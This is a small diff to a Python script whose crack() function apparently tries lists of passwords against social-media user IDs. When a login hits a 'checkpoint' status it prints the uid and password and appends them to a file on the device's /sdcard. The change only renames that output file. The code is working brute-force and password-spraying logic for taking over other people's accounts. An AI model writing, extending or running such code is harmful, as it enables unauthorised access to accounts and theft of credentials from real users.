@@ -220,7 +220,7 @@ def crack(uid, password_list, total_count):
                          continue
             elif 'checkpoint' in log_cookies:
                 print(f"\r\033[1;93m [⚠ SUMON_2f] {uid} | {pw}")
-                open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
+                open("/sdcard/SUMON_CP_FILE.txt", "a").write(f"{uid}|{pw}\n")
                 cps.append(uid+"|"+pw)
                 continue
             else:
